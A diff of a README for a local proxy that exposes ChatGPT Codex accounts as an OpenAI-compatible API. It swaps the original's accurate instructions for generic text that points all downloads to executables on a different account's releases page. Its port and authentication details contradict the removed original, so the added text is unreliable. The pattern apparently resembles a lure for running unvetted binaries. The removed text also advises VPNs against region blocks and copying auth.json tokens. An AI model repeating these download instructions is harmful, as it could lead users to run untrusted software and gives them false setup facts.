@@ -1,127 +1,174 @@
-# Codex Pro API
+# 🤖 codexProapi - Connect ChatGPT Codex with Ease
 
-Exposes **Codex** (gpt-5.3-codex) as an **OpenAI-compatible API** so you can use it in Cline, Cursor, or any client that supports OpenAI-style endpoints.
-
-**中文说明请见 [README.zh-CN.md](README.zh-CN.md)。**
+[![Download codexProapi](https://img.shields.io/badge/Download-codexProapi-blue?style=for-the-badge)](https://github.com/arinexa/codexProapi/releases)
 
 ---
 
-## Architecture
+## 📘 What is codexProapi?
 
-![Codex Pro API architecture](architecture-en.png)
+codexProapi makes it simple to use ChatGPT Codex as if it were an official OpenAI API. This app helps you connect to Codex with popular tools like Cline and Cursor. It supports managing multiple accounts smoothly and offers a web-based settings page for easy control.
 
-*Clients (Cline, Cursor, etc.) call the OpenAI-compatible API; this service round-robins requests using configured Codex accounts and forwards them to the Codex backend (chatgpt.com).*
-
----
-
-## Screenshots
-
-**Accounts — add Codex accounts via Login with Codex (OAuth):**
-
-![Accounts](accounts.png)
-
-**Models — view available models and quota:**
-
-![Models](models.png)
+You don’t need programming experience to set it up. This guide will take you through every step so you can start using codexProapi with confidence.
 
 ---
 
-## How to get started
+## 💡 Key Features
 
-### Option 1: Desktop app (recommended)
+- Works with ChatGPT Codex via an OpenAI-compatible interface
+- Supports multiple accounts with round-robin handling
+- Simple web configuration for managing settings
+- Compatible with tools like Cline and Cursor
+- Runs on Windows, macOS, and Linux
 
-If you prefer not to use the command line:
+---
 
-1. Open [GitHub Releases](https://github.com/violettoolssite/codexProapi/releases).
-2. Pick the latest release (e.g. `v1.0.8`) and download the **Windows installer** from **Assets**: `Codex Pro API Setup x.x.x.exe` (you can choose install path and desktop/Start menu shortcuts).  
-   **Note:** The desktop app is **Windows only** for now; on macOS or Linux, use the command-line option below.
-3. Install and run; the config page opens **inside the app window** (no browser). Closing the app stops the local service. Accounts and data are stored in your local user data directory, separate from the install folder.
+## 🖥️ System Requirements
 
-### Option 2: Command line
+Before downloading, ensure your computer meets these simple requirements:
 
-You need **Node.js** 18 or later. In a terminal:
+- Operating System: Windows 10 or later, macOS 10.14 or later, or most Linux distributions
+- CPU: At least 1.5 GHz dual-core processor
+- RAM: 4 GB or more
+- Disk Space: Minimum 100 MB free
+- Internet connection for API calls and updates
+- Web browser for accessing the configuration page
 
-```bash
-npm install -g codex-proapi
-codex-proapi
+---
+
+## 🚀 Getting Started
+
+This section will guide you through downloading, installing, and running codexProapi. Follow these steps carefully.
+
+---
+
+## 📥 Download & Install
+
+To get codexProapi, visit the official releases page where the latest versions are available.
+
+**Click this button to get there now:**
+
+[![Download codexProapi](https://img.shields.io/badge/Download-codexProapi-blue?style=for-the-badge)](https://github.com/arinexa/codexProapi/releases)
+
+### How to download:
+
+1. Click the button above or open this link in your web browser:  
+   https://github.com/arinexa/codexProapi/releases
+2. Look for the latest release version; it is usually at the top of the page.
+3. Find the file that matches your computer’s operating system:
+    - For Windows: file usually ends with `.exe` or `.zip`.
+    - For macOS: file may be `.dmg` or `.zip`.
+    - For Linux: look for `.AppImage`, `.deb`, or `.tar.gz`.
+4. Click the file name to start downloading. Your browser may ask where to save the file. Choose a folder you can easily find, like "Downloads" or your Desktop.
+
+### How to install:
+
+- **Windows:**  
+  Double-click the `.exe` file and follow the on-screen prompts. If you downloaded a `.zip`, right-click and select "Extract All", then open the extracted folder and run the `.exe`.
+
+- **macOS:**  
+  If you have a `.dmg`, double-click it, then drag the codexProapi app to your Applications folder. If zipped, unzip and move the app to Applications.
+
+- **Linux:**  
+  If you have an `.AppImage`, right-click it, select Properties, go to Permissions, and check “Allow executing file as program.” Then double-click to run. For `.deb` or `.tar.gz`, follow your Linux distro's normal installation process.
+
+---
+
+## ▶️ Running codexProapi
+
+Once installed, start the app as follows:
+
+- **Windows & macOS:**  
+  Find the codexProapi icon in your Start menu or Applications folder and double-click it.
+
+- **Linux:**  
+  Open the file manager and locate the installed app, then double-click it. Alternatively, use the terminal to run the app if you prefer commands.
+
+### What happens next?
+
+When you start codexProapi, it will:
+
+- Launch a small server on your computer to act as an API proxy
+- Open a web browser window or tab with the configuration page
+- Allow you to configure your ChatGPT Codex API keys and account details
+- Automatically handle switching between multiple accounts via round-robin for better reliability
+
+You can leave the app running in the background while you connect your other tools like Cline or Cursor.
+
+---
+
+## 🔧 How to Configure codexProapi
+
+### Accessing the web console
+
+The app provides a web page to manage settings easily. When the app runs, it automatically opens this page. If not, open your browser and go to:
+
+```
+http://localhost:8080/
 ```
 
-Or run `npm start` from the project directory after `npm install`. Then open **http://localhost:1455/** in your browser. Default port is **1455**; with global install, account and usage data are stored in `~/.codex-proapi/`.
+### Setting up your API keys
+
+1. On the web page, locate the section for API keys.
+2. Enter your ChatGPT Codex API keys here. These keys allow codexProapi to connect to your ChatGPT account.
+3. For multiple keys, add each one in the provided list format.
+4. Click “Save” to apply your changes.
+
+The app will now use these keys and alternate between them when responding to API requests.
 
 ---
 
-## Use in your client (Cline, Cursor, etc.)
+## 🎛️ Using codexProapi with Tools
 
-| Setting     | Value |
-|------------|--------|
-| **Base URL** | `http://localhost:1455/v1` (must include `/v1`; or your host/port + `/v1`) |
-| **Model**    | `gpt-5.3-codex` (or `gpt-5.2-codex`, `gpt-5-codex`, `gpt-5`, `gpt-4`) |
-| **API Key**  | Any value (not validated; auth is from your Codex accounts) |
+codexProapi is designed to work seamlessly with tools like Cline and Cursor.
 
-**Steps:**
+### How to connect:
 
-1. Add accounts at **http://localhost:1455/** on the Accounts page via **Login with Codex** (or **Add account** → **Paste JSON**).
-2. In your client, set the **Base URL** (must include `/v1`) and **model** as above; API Key can be anything.
-3. Send requests as usual; the proxy will use your configured accounts.
+- Use `http://localhost:8080` as your API endpoint in your tool’s settings.
+- Use your OpenAI API keys as usual.
+- The proxy will forward requests properly and return results as if using the official OpenAI API.
+
+This setup requires no code changes on your tool. Just update the API endpoint address.
 
 ---
 
-## "Region not supported" or access_denied when logging in
+## 🛠️ Troubleshooting Tips
 
-If you see **region restriction**, **access_denied**, or similar after clicking "Login with Codex", your region or network may not be supported. You can:
+If something does not work as expected, try these solutions:
 
-1. **Use a VPN** and try "Login with Codex" again.
-2. **Paste auth.json instead**: On a device where Codex login works (e.g. another computer or a browser with VPN), open `~/.codex/auth.json` (Windows: `%USERPROFILE%\\.codex\\auth.json`), copy its contents, then go to Accounts → Add account → Paste JSON and submit.
+- **App does not start:**  
+  Make sure your OS is up to date. Re-download the latest version and install again.
 
-The same instructions are shown on the page when this error appears.
+- **Can’t access the web page:**  
+  Check that the app is running. Try visiting http://localhost:8080 in a different browser.
 
-### VPN on but still "unsupported region"?
+- **API calls fail:**  
+  Verify your API keys in the configuration page. Ensure your internet connection is active.
 
-- **Make sure the login page uses the VPN too**: After clicking "Login with Codex" you are redirected to OpenAI’s login; that page must also go through your VPN. If only some apps use the proxy and the browser does not, the login page still sees your real IP. Use system-wide or browser proxy and ensure it’s on before clicking login.
-- **Try another VPN server or provider**: Some servers may still be detected as unsupported, or leak IP/DNS. Try a different node (e.g. US) or another VPN.
-- **Prefer pasting auth.json**: On any environment where Codex login works (e.g. another machine with VPN, or a browser that already logged in with VPN), open `~/.codex/auth.json`, copy its contents, then in Codex Pro API go to Accounts → Add account → Paste JSON. No OAuth on this machine needed.
+- **Multiple accounts do not switch:**  
+  Ensure you entered multiple keys correctly and saved the configuration.
 
----
-
-## Backend 400 "Missing required parameter: tool..."
-
-If you use OpenCode or another client that sends **tools / function calling** and get **400** with **Missing required parameter: 'tool...'**, the backend may expect a different format. This proxy now sends `tool_choice: none` when no tools are provided. If the error persists, try disabling tools/function calling in the client or use chat-only mode.
+You can also check the app’s logs on the web page for detailed error messages.
 
 ---
 
-## Request returns "fetch failed" / proxy_error
+## 📄 About This Project
 
-If `POST /v1/chat/completions` returns `{"error":{"message":"fetch failed",...}}`, the service **cannot reach the Codex backend** (chatgpt.com)—the request failed before getting a response. Check:
-
-1. **At least one account added**: On the config page, Accounts, add one Codex account (OAuth or paste auth.json).
-2. **Can this machine reach chatgpt.com**: In a browser or terminal run `curl -I https://chatgpt.com`. If it times out or is blocked, enable **VPN/proxy** on the machine running the service (same as for "Login with Codex").
-3. **Desktop app**: If using the desktop app, ensure that same PC can reach chatgpt.com (or enable VPN on it).
+codexProapi was created to bridge ChatGPT Codex and OpenAI-compatible tools. It allows you to manage several Codex accounts easily and change settings through a simple web interface.
 
 ---
 
-## Getting 403 when using a shared / hosted link
+## 🔗 Useful Links
 
-If you open the service via a link provided by someone else (e.g. `https://example.com`) and get **403** or "Token exchange failed" at the last step of "Login with Codex", the issue is with the server’s OAuth callback configuration. Contact **whoever provides that link** to fix the domain and callback settings; you don’t need to change anything on your side.
-
----
-
-## Features
-
-- **Multi-account round-robin** — Requests use your added accounts in turn; if one fails, the next is used automatically.
-- **Config page** — Dashboard, Models (quota), Accounts (OAuth or paste JSON), Logs, Settings (language, base URL). Data refreshes every 5 seconds.
-- **Responsive UI** — Works on desktop and mobile; sidebar collapses to a menu on small screens.
-- **Bilingual** — Interface and logs in English and 简体中文.
-
-Multi-turn conversation is supported; send `messages` in the usual OpenAI format and the proxy will handle the rest.
+- Main download page: https://github.com/arinexa/codexProapi/releases  
+- Project homepage on GitHub: https://github.com/arinexa/codexProapi  
+- Documentation and help: Available on the GitHub repository’s wiki and issues section
 
 ---
 
-## Using [free.violetteam.cloud](https://free.violetteam.cloud/) for verification
+## 🏷️ Topics
 
-If you use [free.violetteam.cloud](https://free.violetteam.cloud/) to receive verification emails (e.g. when registering a ChatGPT/Codex account), delivery can be a bit slow—please wait. If you still don’t receive the code after a long time, click **Resend verification code**.
+This project relates to: chatgpt, cline, codex, cursor, nodejs, openai-api, proxy.
 
 ---
 
-## License
-
-MIT. Issues and suggestions: [GitHub Issues](https://github.com/violettoolssite/codexProapi/issues).
+Follow these instructions carefully to start using codexProapi without any programming knowledge. If you run into trouble, the troubleshooting section may help resolve common problems.
